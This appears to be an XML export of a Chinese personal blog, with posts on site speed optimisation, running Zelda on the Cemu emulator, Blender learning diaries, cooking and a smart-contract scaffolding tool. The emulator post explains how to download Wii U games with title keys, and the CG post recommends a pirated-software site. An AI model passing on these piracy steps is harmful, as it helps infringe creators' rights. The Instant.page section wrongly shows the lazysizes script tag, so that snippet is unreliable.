<p>如果需要看网站在各个地区的加载速度，可以使用<a href="http://tool.chinaz.com/speedtest">站长工具</a>和<a href="https://www.17ce.com/">17CE</a>。</p>
<p>对于网站SEO，内容，流量之类的报告可以参考<a href="https://www.similarweb.com/website/inevitable.tech">SimilarWeb</a> 和 <a href="https://www.alexa.com/siteinfo/">Alexa</a>。但是如果你的博客流量很少，以上的这些网站大部分栏目都会是空着的，因为没有足够的数据进行分析。</p>
<h2 id="性能">性能</h2>
<p>我的博客从电脑端加载性能还算不错（Speed Index 在1.1s左右），但手机端性能奇差无比（Speed Index在5s左右）。归功于中国的网络设施，从中国访问我的网站加载速度也非常的慢。</p>
<h3 id="cdn">CDN</h3>
<p>CDN是提升博客加载速度最方便的方法。我选择的是<a href="https://dash.cloudflare.com/">CloudFlare</a>。只要将域名的NS服务器改到CloudFlare上，CDN便会自动生效。这可以大大提升博客在全世界各地，除了中国的访问速度。</p>
<p>据说将SSl/TLS&gt;Overview中的SSL模式改成Flexible可以提升网站的加载速度。但是Netlify默认HTTPS，如果将SSL模式改成Flexible，加载网站时会无限重定向，导致加载失败。</p>
<p>需要注意的是在Speed&gt;Optimization&gt;Rocket Loader开启的情况下，可能导致加载网页时Console中出现错误。但是并不会影响网站的加载和用户的浏览。</p>
<p>CloudFlare有中国节点，但是需要升级到Business版本并且提供备案证明。</p>
<p>如果需要进一步优化国内访问速度，可以考虑备案以后使用国内的CDN供应商，或者将网站托管在<a href="https://coding.net/">Coding</a>上。</p>
<h3 id="外部脚本">外部脚本</h3>
<p>综合下来，速度最快的是<a href="https://www.jsdelivr.com/">jsDelivr</a>。海外速度一流，从中国访问的速度也还行。几乎所有的常见第三方脚本都可以在上面找到。</p>
<p>从中国访问，速度最快的是<a href="https://www.bootcdn.cn/">BootCDN</a>。中国访问速度一流，但是海外速度是不行。</p>
<p>综合考虑了一下，博客内的所有脚本都采用jsDelivr上的。</p>
<h3 id="dns-prefetch">dns-prefetch</h3>
<p>将<code>&lt;link rel="dns-prefetch" href="https://yourSourceDomain.com"/&gt;</code>添加到Head中，可以让浏览器提前解析这些域名。减少加载外部脚本时的延迟。</p>
<h3 id="图片">图片</h3>
<p>图片无处不在：头像，题图又或者是博客中的图片。一个图片动辄几百kb，极大的拖累了网站的加载速度。</p>
<h4 id="图片压缩">图片压缩</h4>
<p><a href="https://developers.google.com/speed/webp#webp_converter_download">Webp</a>是Google近年来推出的无损图片格式。Webp比PNG小26%。大部分主流浏览器也支持Webp格式。如果将JPG图片压缩成Webp，并且接受80%的图像质量，文件大小可以减少60%。</p>
<p>Webp其一的补足就是编码和解码的速度要慢上不少。虽然解码速度慢了，但是文件体积减少了。Webp节省下来的图片下载时间完全大于多花在解码上的时间。</p>
<p>另一个补足便是它做不到全平台的支持。Safari不支持Webp。因此我们可以考虑给safari用户特供PNG图片。</p>
<p>我使用的是<a href="https://zhitu.isux.us/">腾讯智图</a>。大部分时候图片品质的差距很难看出来。因此为了性能，我普遍选择30的图片品质。</p>
<h4 id="图片懒加载">图片懒加载</h4>
<p>不加载用户看不到的图片。等那些图片进入用户的视线再加载。</p>
<p>虽然Chrome的设置中已经有了lazy load 的选项，但并不是默认开启的。因此我们需要一个第三方库。我选择的是<a href="https://github.com/aFarkas/lazysizes">lazysizes</a>。将<code>&lt;script src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js" async&gt;&lt;/script&gt;</code> 插入到主题对应的位置。然后将<code>&lt;img src="&lt;%- url_for(theme.img.avatar) %&gt;" /&gt;</code>改成这个样子<code>&lt;img class="lazyload" data-src="&lt;%= url_for(theme.img.avatar) %&gt;" &gt;</code>。也就是为<code>img</code>加上<code>class="lazyload"</code>，将<code>src</code>改为<code>data-src</code>。</p>
<h3 id="脚本异步加载">脚本异步加载</h3>
<p>对于不需要立即加载的脚本，我们可以采用异步加载。比如<code>analytica.js</code>,我们并不在意它什么时候加载。我们可以使用<code>&lt;script async src="https://www.google-analytics.com/analytics.js"&gt;&lt;/script&gt;</code>。</p>
<p><code>async</code>让外部脚本的加载完全独立于页面的加载。即<code>DOMContentLoaded</code>和有<code>async</code>的外部脚本没有任何关系。页面不再会等待这个脚本的加载。其他脚本也不会等待这个脚本的加载了。因此对于完全独立的脚本我们可以为它加上<code>async</code>。这样这个脚本的加载就不会阻塞页面的加载。</p>
<h3 id="字体">字体</h3>
<p>如果看一看各个网站资源的大小，字体总是最大的那个。随着对网站设计的要求越来越高，越来越多的网站选择自定义字体。这便给网站带来了很大的性能开销。通常情况下，在字体加载完全之前，页面是不会进行渲染的。即页面上不会出现一个字。</p>
<p>为了减少用户感知到的等待时间，我们可以让内容一开始采用默认字体显示出来。等自定义字体加载完全后，再替换掉默认字体。我们需要做的仅仅是给<code>@font-face</code>加上一行<code>font-display: swap；</code>。</p>
<h3 id="instant.page">Instant.page</h3>
<p>用户想要点击一个链接是有预兆的。在电脑端，他们的鼠标会悬浮在超链接上。在手机端，他们会按下超链接（当手指松开时，才会触发点击）。这中间大概留给电脑几十毫秒的反应时间。如果我们提前对下一个页面进行加载，这就可以减少用户的等待时间。</p>
<p><a href="https://instant.page/">Instant.page</a>就实现了这样的功能。将<code>&lt;script src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js" async&gt;&lt;/script&gt;</code>加入网站，就可以享受这种近乎无赖的优化。</p>
<h2 id="内容">内容</h2>
<p>除了让用户可以顺利的打开博客，博客的内容也是很重要的</p>
<h3 id="清晰的标题">清晰的标题</h3>
<p>现代人不习惯花费大量时间阅读长篇文章。因此文章的分段，子标题一定要齐全。</p>
<p>用户第一眼看到的是文章标题和摘要。一个清晰的标题和摘要可以帮助读者了解这篇文章的主旨。当用户来到文章的页面时，清晰的子标题可以帮助读者确定他想阅读那一段。没有人想面对那种又臭又长的文章。</p>
<h3 id="标签">标签</h3>
<p>标签尽量要齐全。标签可以帮助用户寻找到它所感兴趣的内容。当然最重要的还是让搜索引擎知道这篇文章到底讲了什么，什么时候展示这篇文章。</p>
<h3 id="latex">Latex</h3>
<p>考虑到之后会写数学相关的内容，Latex也需要准备好。</p>
<h3 id="footnote">Footnote</h3>
<p>在写<a href="https://www.inevitable.tech/about/">关于</a>时候有了脚注的需求，因此添加了脚注。估计之后写数学内容的时候也用的上。</p>
<h3 id="摘要">摘要</h3>
<p>我的摘要总是独立于文章的。这个主题默认将摘要作为正文的第一段。这让我的文章有一种割裂感。因此我将摘要从正文中移除。</p>
<h2 id="未来">未来</h2>
<h3 id="字体-1">字体</h3>
<p>由于我的文章都较长，因此会考虑换一个字体。可能会考虑思源宋体。这个衬线体比较适合于较长的文章。(已完成)</p>
<h3 id="手机端性能优化">手机端性能优化</h3>
<p>手机端的性能还是远远落后于电脑端，也达不到优秀的水准。手机端的还是有较大的提升空间。</p>
<h3 id="web-notification-push">Web Notification Push</h3>
<p>相比于邮件订阅，浏览器通知订阅似乎更吃香。考虑以后添加浏览器通知的支持。到时候记得订阅哦。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>博客优化</tag>
        <tag>性能</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>在 PC 上玩塞尔达传说</title>
    <url>/posts/b2365e06/</url>
    <content><![CDATA[<p>没有 Switch 也可以玩满分游戏塞尔达：荒野之息</p>
<a id="more"></a>
<p>Wiiu 是任天堂的一款掌机平台。大部分登录 Switch 的游戏都会登录 Wiiu。因此想要玩上塞尔达传说，除了用 Switch 模拟器，我们还可以用 Wiiu 模拟器。</p>
<p><a href="https://cemu.info/">Cemu</a> 便是一款较为成熟，使用方便，支持丰富插件的 Wiiu 模拟器。</p>
<p>下载安装 Cemu 后，游戏应该去哪下载？需要注意的是 Wiiu 游戏分美版，欧版和日版。这些版本的语言并不通用。大部分的汉化补丁只能运行在日版游戏之上。</p>
<h1 id="游戏下载">游戏下载</h1>
<p>游戏下载可以用 <a href="https://github.com/llakssz/FunKiiU">FunKiiU</a>。只要输入需要游戏的 Title 和 Key 即可下载。在 <a href="https://skylerspark.github.io/wiiu-titlekeys/">这个网站</a> 上可以查询到游戏的 Title 和 Key。注意！不要漏掉可能存在的补丁和 DLC。如果漏掉了补丁，可能会出现<code>Your must perform a system update to play ***</code>。<a href="https://youtu.be/pZ8OBRxJWf8">这儿</a> 有解决方法。</p>
<p>除了 Funkiiu 这个工具，我们也可以在 <a href="https://glazec-awesome-love-4933.github.dev">这个网站</a> 进行下载。这个网站上集合了很多 Wiiu 游戏，并且这些游戏都包含汉化补丁。</p>
<h1 id="游戏处理和安装">游戏处理和安装</h1>
<p>下载完游戏，我们需要将这些凌乱的文件解密成 Wiiu 模拟器可读的文件。<a href="https://github.com/skylerspark/CDecrypt-Release">CDecrypt</a> 可以帮助我们进行解密。将<code>title.tik</code>和<code>title.tmd</code>拖入<code>CDecrybt_v2.0b.exe</code>。<code>CDecrybt_v2.0b.exe</code>会将这些文件解密为<code>code/</code>,<code>content/</code>,<code>meta/</code>三个文件夹。具体步骤可以参考 <a href="https://www.youtube.com/watch?v=swIkVIOUsOc">这个视频</a>。</p>
<p>导入 DLC 和补丁都是打开 Cemu-&gt;文件-&gt;Install game title, update or DLC，选中<code>meta/meta.xml</code>即可。</p>
<p>汉化补丁以图像插件的形式工作。我们需要将下载下来的汉化补丁放到<code>Cemu/graphicPacks</code>下，并且自己为其编写一份<code>rules.txt</code>。具体操作见<a href="https://www.youtube.com/watch?v=swIkVIOUsOc&amp;ab_channel=TheDarkHollow">这个视频</a>。</p>
<h1 id="游戏优化">游戏优化</h1>
<p>在图像插件之中有一些提升画质，粒子效果，阴影的插件，还有锁帧，更改分辨率的插件。这些插件根据个人需要打开。</p>
<p>Cemu 有两套 API 可以使用。在选项-&gt;工具-&gt;常规设定-&gt;图像中可以查看。分别为 OpenGl，Vulkan。Vulkan 可以调用显卡，提供更好的性能。</p>
<p>除了更改 API，我们还可以对 CPU 进行设置。右键点击游戏-&gt;Edit game profile, 我们可以根据自己的 CPU 性能调整 CPU ModeMode。 Thread quantum 对性能影响不大。</p>
<p>最提升性能的是替换 Shader 缓存。在<a href="https://www.reddit.com/r/CEMUcaches/comments/8pocf4/complete_shader_cache_collection/">这个网站</a>上可以找到几乎所有游戏的 shader 缓存，将下载下来的文件放入<code>cemu/shaderCache/transferable/</code>。这个缓存并没有覆盖所有的资源，即在游戏中我们还会需要加载部分资源。但是相较于不替换，有着巨大的提升。具体步骤 <a href="https://www.bilibili.com/s/video/BV1D5411t7sA">参考视频</a>。</p>
<p>就塞尔达荒野之息，还有 <a href="https://www.youtube.com/watch?v=IQzr-B7DjrU&amp;ab_channel=DigitalDreams">个人开发的光追插件</a>，为塞尔达加上了真实的光影。</p>
<p>终于可以玩上塞尔达了。这个模拟器的性能还行，虽然不能让我达到全程 60 帧，加载素材总会有一点卡，但也总算是能在不差的画质下流畅的跑起来。就连 Switch 的陀螺仪也可以通过 PS4 手柄的陀螺仪进行模拟。这篇文章只是概述了整个流程，具体步骤我都尽量附上了视频。<a href="https://www.youtube.com/watch?v=swIkVIOUsOc&amp;ab_channel=TheDarkHollow">最后这个视频</a> 解释了游戏下载，游戏文件处理汉化安装和输入设置。</p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Cemu</tag>
        <tag>Switch</tag>
      </tags>
  </entry>
  <entry>
    <title>CG日记2-城市</title>
    <url>/posts/578b8b94/</url>
    <content><![CDATA[<p>累计使用 30 个小时！</p>
<a id="more"></a>
<p>终于累计使用时间来到了 30 个小时，可以说有一点入门了。</p>
<p>这个作品描绘了疫情散布的城市。红色代表了病毒。整个材质的风格想要参考微软的亚克力材质，然而我的还是有点出入。虽然大家都是半透明，但是我的材质没有那种通透的感觉。</p>
<p>整个制作过程还是很简单的。先通过 <a href="https://gumroad.com/l/blender-osm">OSM</a> 生成城市白模，然后自己做一个类亚克力材质，最后加上天空的光照。天空的光照我用的是 <a href="https://blendermarket.com/products/physical-starlight-and-atmosphere">Physical Starlight And Atmosphere</a>。参数不算多，随便调一调就可以用了。</p>
<p>模型的颜色我使用了一个相交以前复杂一些的 Node 组合。Node 相较于 Texture paint 非常的灵活。Node 随时可以调整，而且不会对模型造成不可逆的影响。</p>
<center>
<img class="lazyload" data-src="/static/images/cg2-1.png" height="80%">
</center>
<p>这次我增加了后期调色的工序。由于 Adobe 太贵，<a href="https://rawtherapee.com/">Rawtherapy</a> 不支持 Blender 到处的 OpenExr 格式，我暂时使用 <a href="https://www.darktable.org/">Darktable</a>。Darktable 体积小巧，功能也大多完整。取色器不知道为什么格外的不好用。如果 Darktable 不适合我，我会考虑尝试 Affinity photo。它又便宜，还有 Vectorscope 等图表，用来调色估计会更加精确。</p>
<center>
<img class="lazyload" data-src="/static/images/cg2-2.png" height="80%" width="80%">
</center>
<center>
<img class="lazyload" data-src="/static/images/cg2-3.png" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>Arts</category>
      </categories>
      <tags>
        <tag>CG</tag>
      </tags>
  </entry>
  <entry>
    <title>chapter1</title>
    <url>/posts/5ff363cd/</url>
    <content><![CDATA[<p>新的篇章 <a id="more"></a></p>
<h2 id="写在前面">写在前面</h2>
<p>之前写的东西，真的是语无伦次，我自己都看不下去，改不下去了。能看下取得人都是正真关心我的人，谢谢了。</p>
<h2 id="为什么是一个新的篇章">为什么是一个新的篇章？</h2>
<h3 id="x001">0x001</h3>
<p>我来到了高中的结尾，申请季。这是一段奇特的时光，我会彷徨，我会壮志凌云，我也会颓废。这些完全相反的心理变化，却在这短短的一段时间里不断反复。这本就是一件有意思的事情。在这样一个新的篇章中，我会质疑自己，在迷茫的雾气中寻找我最基础的价值观。</p>
<p>在申请季中，各种矛盾随着外界的压力不断凸显出来。但是这些矛盾终将会统一。正题和反题终将变成合题，被思想所吸收。思想在这个过程中将中不断改变。寻找自身的变化一直是我写博客的一个主要目标。</p>
<h3 id="x002">0x002</h3>
<p>这次我的写作目标将不再是随笔，而是分享我的想法。所以对写作结构将会有一些改变。</p>
<ol type="1">
<li>每篇文章的论题范围将缩小</li>
<li>在文章开头交代论题</li>
<li>文章更加的精简</li>
<li>充分论证结论</li>
</ol>
<figure>
<img data-src="static/images/chapter1.jpg" alt="war" /><figcaption aria-hidden="true">war</figcaption>
</figure>
<hr />
<p>这是我之前的<a href="https://kismetcruz.blogspot.com/">博客</a></p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>开始</tag>
      </tags>
  </entry>
  <entry>
    <title>CG日记0-第一个苹果</title>
    <url>/posts/c30576fa/</url>
    <content><![CDATA[<p>开始学习CG的前十个小时真是处处劝退。 <a id="more"></a></p>
<p>CG是一个应用很广泛的技术。从游戏，电影，广告，产品设计，建筑到工业设计都可以看到它的身影。各个行业对它的使用也不尽相同，有用来做特效，动画，模型的也有设计图，或者图片的。CG是一个很自由的技术，它可以把你想象中的画面分享给你的观众。</p>
<h1 id="为什么要学cg">为什么要学CG？</h1>
<p>我的专业是数学，未来很有可能是一个工程师，去创造或优化一些产品。但我觉得这太窄了，我想要有更多的创造能力。CG就是这样一个强大的工具，赋予我视觉层面无限的创造能力。最近看到 Wlop 也开始尝试3D的创作。Rain 相比于他之前的2D作品，有更强的真实感，沉浸感。但是3D的创造需要更多的时间。Wlop 说他花了两个月在 <a href="https://www.youtube.com/watch?v=02ANvw_dYhQ">Rain</a> 上。</p>
<h1 id="使用什么软件">使用什么软件</h1>
<p>这算是初学者面临的第一个问题，用哪个软件会比较好。不同的软件教程数量也不一样。在3D领域，有非常多的软件。他们的价格不一样，功能也或多或少有点区别。比如 Sketchup 专注于建筑领域，Hudini 专注于视觉效果（VFX）。不是说这些软件只能做这一件事，而是他们在这个方面会更加的有优势。我是使用的 Blender，一个开源的软件。它的特点就是功能多和免费。基本上所有的 3D 的事情它都能干。Blender 的官方论坛也是很活跃的，帖子的回复速度非常的快，我是在一天之内就得到了回复。</p>
<h1 id="如何开始的">如何开始的？</h1>
<p>我看了 <a href="https://www.youtube.com/watch?v=j14b25SnYRY&amp;list=PL3UWN2F2M2C8-zUjbFlbgtWPQa0NXBsp0">CGBoost</a> 的新手教程。</p>
<p>这个教程不短，但是包含了很多内容。在这个作品中，我们需要学习基本的建模，贴图，物理模拟，灯光，构图和渲染。虽然每个方面的内容都不深，但这就是新手教程的特点，浅但是广。很多地方其实这个教程的解释都不够深入，没有对于一些术语或者工具进行原理上的阐述。CGBoost 的切入点是视觉。这个参数调整后，人眼看上去会有什么区别。</p>
<p>苹果是我的第一个建模。在成品中我选择最好看的角度。但是仔细看的话，还是可以看出形状有些奇怪，贴图不太对的问题。整个工作流中我最喜欢的是构图。所有的物体都是可以移动的，因此我可以选取他们最好看的角度渲染出来。总感觉它跟摄影的构图类似，但是比摄影强大。毕竟摄影会局限于环境，但是 CG 构图真的是随心所欲。</p>
<h1 id="接下来的目标是什么">接下来的目标是什么？</h1>
<p>我大概已经想好了接下来的一系列作品，将会着重于模拟照片的感觉。我尽量想营造出真实的感觉。</p>
<h1 id="遇到了什么困难吗">遇到了什么困难吗？</h1>
<p>3D的入门要变扭和难很多。在2D的屏幕上创造3D场景不是个容易事。视角的移动也硬生生的比2D屏幕多出一个维度。操作感受就是不流畅。在2D的制作中，比如音频和视频，我们用的时间条。鼠标左键可以完成选取，移动，跳跃，缩短或拉长等等。但是在3D中，鼠标左键不再这么强大。缩短或拉长需要配合快捷键。操作起来有点像PS。视角的移动要靠鼠标中键加上 Shift。没错，单单一个鼠标中键干不好视角的移动。我们用鼠标中键来旋转视角，Shift+鼠标中键来平移视角。直到现在，我还不能熟练的移动视角。</p>
<p>软件的选项和快捷键有很多。我的键盘又是无刻版的，因此经常会按错键。有一次我按错了键，导致模型不能缩放。我花了半个多小时弄明白那个缩放的开关在哪里。一开始我找的答案是旧版的Blender的设置。新版的Blender 界面的布局发生了很大的变化。那个存在与旧版的设置在新版里面直接换了个位置，还换了个样子。</p>
<p>光影要做好感觉是最难的。光影的参数有不少，但是很难对他们进行有效的评估。我不是做摄影的，对于光影也没有深刻的人认识。</p>
<h1 id="资源">资源</h1>
<p>这些都是我在接触CG的前十小时找到的资源。希望对于跟我一样的初学者有用。我会把我每一个阶段用的资源都展示出来。</p>
<h2 id="论坛">论坛</h2>
<p><strong><a href="https://www.blendernation.com/">blenderNation</a></strong>:这是个集合 Blender <strong>正版插件</strong>，<strong>教程</strong>和<strong>访谈</strong>的论坛。 <strong><a href="https://www.deviantart.com/">DeviantArt</a></strong>:作品网站。用户上传自己的作品。这个网站里的作品不局限于 3D，也有平面插画。用户体验一般，网站里的作品质量鱼龙混杂。 <strong><a href="https://www.artstation.com/">ArtStation</a></strong>:作品网站。作品质量较高。 <strong><a href="https://cgcookie.com/">CGCookie</a></strong>:采用订阅式的<strong>教程</strong>网站。 <strong><a href="https://www.blenderguru.com/">Blenderguru</a></strong>:博客类似的<strong>免费教程</strong>网站。作者将教程视频放到了Youtube上。以 Tips 和作品向的教程为主。 <strong><a href="https://cgboost.com/">CGBoost</a></strong>：收费的<strong>课程</strong>网站。网站的制作还是比较精美的。网站上面有一个免费的新手教程。我看的就是那个。 <strong><a href="https://www.udemy.com/courses/search/?src=ukw&amp;q=blender">Udemy</a></strong>: 大家耳熟能详的在线教育平台。上面的系列视频普遍时间比较长，感觉不是那么灵活。 <strong><a href="https://blenderartists.org/">BlenderArtist</a></strong>:一个Blender论坛。大家在上面<strong>讨论问题</strong>,<strong>分享作品</strong>。这个论坛还是挺活跃的。 <strong><a href="http://iiidea.cn/">iiiDea</a></strong>:国内的一个采用订阅式的<strong>盗版资源站</strong>。上面有很多软件的破解版，插件的破解版，模型，贴图以及搬运的教程。更新还是挺快的。</p>
<h2 id="插件">插件</h2>
<p><strong><a href="https://www.blendernation.com/2020/05/09/seashells-add-on-an-update-create-paper-fans/">风车</a></strong>：一键生成纸风车。图个乐呵。 <strong><a href="https://blendermarket.com/products/flipfluids">FlipFluid</a></strong>：非常厉害的流体插件。仔细观察很久以前的流体，你会发现他们没有气泡没有泡沫(海浪那样白色的泡沫)。这个插件较早实现了流体的泡沫，气泡和飞沫。在新版的Blender中内置了一个新的非常优秀的流体模拟器。基本上FlipFluid能做的事情，新的流体模拟器都能做。</p>
<p>希望我的一些体验对于徘徊在门口的人有所帮助。总的来说CG的上手难度很大，需要花费的精力也很多，但是效果也很惊艳。即使是一个新手，也可以做出看起来可以的作品。对我个人来说它的作品效果要好于平面绘画。同样是十个小时，可能我平面绘画的作品就看上去完全不行。</p>
最后附上作品。对作品流程感兴趣的可以观看<a href="https://www.youtube.com/watch?v=5WMUrHKxfhE&amp;t=11s">Youtube</a>或者<a href="https://www.bilibili.com/video/BV1Te411W7Mf/">Bilibili</a>。
<center>
<img class="lazyload" data-src="/static/images/cg0.png">
</center>
]]></content>
      <categories>
        <category>Arts</category>
      </categories>
      <tags>
        <tag>CG</tag>
      </tags>
  </entry>
  <entry>
    <title>烹饪</title>
    <url>/posts/6fffa8be/</url>
    <content><![CDATA[<p>到了外面，难免就想做些菜。住所附近的餐馆，味道大多一般，甚至差劲。偶尔有一两家味道好的，吃多了也会腻。 <a id="more"></a> 一般我做菜都是从大厨们的食谱看起。看看他们的视频中做了什么菜，那我也尝试的去做一下。就像十六十七世纪的画师学徒一样，他们会临摹老师的画，并在其中做出自己的改变，以求超越老师。我平日里看的比较多的是Gordon Ramsay和王刚。一个学习做川菜，一个学习做西餐。跟着王刚做的菜大多没有翻过车。王刚的视频虽然短，但是重点都会提到，最后还有技术总结。Gordon Ramsay的视频质量参差不齐，视频创作的时间跨度也很长。早年做的视频缺少细节，比如他不会像王刚一样每次都提到锅烧到几成热，油烧到几成热。这些信息对于我这样的新手来说还是很有用的。记得有一次我跟着做早饭-煎蘑菇番茄，炒鸡蛋配酸面包。视频中说把整个蘑菇放到油锅里后就不用管它了，锅子会自动帮你煎好你的蘑菇。我照着做了，中途也没有翻面什么的。结果不难想象，它焦了。这样的事情发生的还是挺频繁的。现在我基本看他在Master Class上的课程。这一套课程中除了有视频，还有配套的教材，里面有详细的步骤说明。如果在视频中用到烤箱，大多数时候我得在教材里才能找到烤箱的温度。</p>
<p>有很多菜在美国是很难看见的，比如王刚的芹菜炒肉丝中，他使用的是水芹菜，而这只有那种又大又粗可以生吃的芹菜。但这里也有很多中国不常见的菜。比如 baby carrot，块芹菜等，还有一堆陌生的香料。在中国常见的香料是茴香，八角，桂皮，葱，姜，蒜，香菜等。厨师们大多都用这些香料。但是在美国，各个厨师有着自己偏好的香料。基本分为重香料和轻香料。轻香料也就是味道比较轻的香料，常在夏天用。重口味的会留在冬天。Gordon Ramsay常用的香料有，百里香(thyme)，迷迭香(rosemary)，龙蒿(tarragon)，香菜(parsley)，薄荷(mint)，莳萝(dill)。这其中要注意的是有些香料不能切的太碎。有的香料跟鱼一起烧很棒比如龙蒿(tarragon)，莳萝(dill)，有的跟肉一起烧很棒比如迷迭香(rosemary)。还有一些香料是他不常用的比如葱(green onion)，罗勒，九层塔(Basil)。</p>
<p>烧菜的器具上也会有很多差距，中餐很多时候有一把大菜刀，一口铁锅就行了。西餐中和大菜刀地位一样的是主厨刀，作为万能刀的它其实不是那么万能。主要原因是它刀背太薄了，砍不了骨头。比如它不能剁鸡或者骨头。有时候我切西瓜也挺困难，实在是太小了和中式的菜刀相比。手感倒比中式的大菜刀好上不少，因为它小上许多，更加的灵活。 除了一口炒锅或者说煎锅，煮锅（sauce pan）也是必不可少的。经常需要用来炒鸡蛋（scramble egg）之类的。如果用水浴（sous vide）的话，还需要一口又大又深的汤锅。这些锅子又分为不粘锅和不锈钢锅，这个就看个人喜好了。</p>
<p>除了锅子，西式还有各种各样中式用不到的厨具。比如厨房夹-用来煎牛排，压土豆泥的工具，刨起司的工具，必不可少的厨房用纸，塑料或木质的铲刀（以防刮坏不粘锅），抹刀（Spatula）用来拌东西，打蛋的搅拌器-平时用来搅拌酱，研磨钵用来做酱料比如意大利青酱，研磨器用来现磨黑胡椒-现磨的黑胡椒会有更浓郁的香味，滤网-用来过滤酱汁或者焯水的蔬菜。</p>
<p>家里常备的调料也会多上不少，因为又要做西餐，又要做中餐。现在家里常备的东西有生抽，老抽，生粉，耗油，黄油，奶油，干辣椒，花椒，豆瓣酱，味增，橄榄油（用来凉拌或者煎东西），牛油果油（用来炒菜），盐，胡椒。</p>
<p>平时西餐或者中餐我并没有特别大的偏好，只是因为我的电饭锅没到，烧中餐没有主食，这几天便一直吃西餐。烧了不少牛排，做了不少鸡蛋。看看以后这中餐和西餐烧多了，会不会有什么奇思妙想。</p>
]]></content>
      <categories>
        <category>Cook</category>
      </categories>
      <tags>
        <tag>Cook</tag>
      </tags>
  </entry>
  <entry>
    <title>Create Smart Contract</title>
    <url>/posts/458d64bd/</url>
    <content><![CDATA[<p>一键搭建初始化以太坊开发环境。</p>
<a id="more"></a>
<h1 id="开发经历">开发经历</h1>
<p>这个项目有点类似 create-react-app。目的是帮助开发者快速初始化开发环境。做起来还是挺简单的。就是写一个 Node 脚本。里面包含初始化项目文件夹，安装依赖和替换模板文件。具体项目使用和介绍可以 <a href="https://github.com/glazec/create-smart-contract">看 Github 主页</a>。</p>
<h1 id="使用指南">使用指南</h1>
<p>首先你得已经全局安装 truffle。这样<code>create-smart-contract myapp</code>，会用 truffle 为你初始化一个项目文件夹。然后为你安装一系列有用的插件和包。最后给你生成一些默认的配置文件。以下是包含的框架，插件，包和配置文件。由于目前 Openzeppelin 不支持 0.8 的 solc，所以我默认使用 0.7 的最新版。</p>
<ul>
<li><a href="https://www.npmjs.com/package/truffle">truffle</a>
<ul>
<li><span class="citation" data-cites="truffle/hdwallet-provider">[@truffle/hdwallet-provider]</span>(https://www.npmjs.com/package/<span class="citation" data-cites="truffle/hdwallet-provider">@truffle/hdwallet-provider</span>)</li>
<li><a href="https://www.npmjs.com/package/eth-gas-reporter">eth-gas-reporter</a></li>
<li><a href="https://www.npmjs.com/package/solidity-coverage">solidity-coverage</a></li>
<li><a href="https://www.npmjs.com/package/truffle-assertions">truffle-assertions</a></li>
</ul></li>
<li><a href="https://www.npmjs.com/package/hardhat">hardhat</a>
<ul>
<li><span class="citation" data-cites="nomiclabs/hardhat-ethers">[ @nomiclabs/hardhat-ethers]</span>(https://www.npmjs.com/package/<span class="citation" data-cites="nomiclabs/hardhat-ethers">@nomiclabs/hardhat-ethers</span>)</li>
<li><span class="citation" data-cites="nomiclabs/hardhat-truffle5">[@nomiclabs/hardhat-truffle5]</span>(https://www.npmjs.com/package/<span class="citation" data-cites="nomiclabs/hardhat-ethers">@nomiclabs/hardhat-ethers</span>)</li>
<li><span class="citation" data-cites="nomiclabs/hardhat-waffle">[@nomiclabs/hardhat-waffle]</span>(https://www.npmjs.com/package/<span class="citation" data-cites="nomiclabs/hardhat-waffle">@nomiclabs/hardhat-waffle</span>)</li>
<li><span class="citation" data-cites="nomiclabs/hardhat-web3">[@nomiclabs/hardhat-web3]</span>(https://www.npmjs.com/package/<span class="citation" data-cites="nomiclabs/hardhat-web3">@nomiclabs/hardhat-web3</span>)</li>
</ul></li>
<li><a href="https://www.npmjs.com/package/ethers">ethers</a></li>
<li><span class="citation" data-cites="openzeppelin/contracts">[@openzeppelin/contracts]</span>(https://www.npmjs.com/package/<span class="citation" data-cites="openzeppelin/contracts">@openzeppelin/contracts</span>)</li>
<li><a href="https://www.npmjs.com/package/chai">chai</a></li>
<li><a href="https://www.npmjs.com/package/solidity-docgen">solidity-docgen</a></li>
<li><a href="https://www.npmjs.com/package/mocha">mocha</a></li>
<li><a href="https://www.npmjs.com/package/prettier">prettier</a></li>
<li><a href="https://www.npmjs.com/package/prettier-plugin-solidity">prettier-plugin-solidity</a></li>
<li><a href="https://www.npmjs.com/package/solc">solc</a></li>
<li><a href="https://www.npmjs.com/package/web3">web3</a></li>
<li><a href="https://www.npmjs.com/package/ethereum-waffle">ethereum-waffle</a></li>
<li>.gitignore</li>
<li>.prettierrc</li>
<li>hardhat.config.js</li>
<li>slither.config.json</li>
<li>solcover.js</li>
<li>truffle-config.js</li>
</ul>
<p>除此之外我还加入了一些有用的 Node 脚本。</p>
<ul>
<li><code>npm run test</code>: 用来跑测试的。我这采用了 Hardhat。因为它跑 test 的速度快，并且支持在智能合约中使用<code>console.log</code>。</li>
<li><code>npm run doc</code>: 根据 <a href="https://docs.soliditylang.org/en/v0.8.0/natspec-format.html">doxygen</a> 自动生成文档。</li>
<li><code>npm run coverage</code>: 根据配置文件 <code>.solcover.js</code> 生成测试覆盖率报告。</li>
<li><code>npm run analyze</code> 根据配置文件 <code>slither.config.json</code> 静态分析智能合约。<em>注意：要求已经安装 <a href="https://github.com/crytic/slither#how-to-install">Slither</a></em></li>
</ul>
<h2 id="自定义">自定义</h2>
<h3 id="包">包</h3>
<p>你可以自定义想要的包。更改<code>index.js</code>的<code>installPackages</code>。例如</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> installPackages = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;\nInstalling hardhat\n&quot;</span>.cyan);</span><br><span class="line">    shell.exec(<span class="string">`npm install --save-dev hardhat`</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;\nFinished installing packages\n&quot;</span>.green);</span><br><span class="line">      resolve();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="模板">模板</h3>
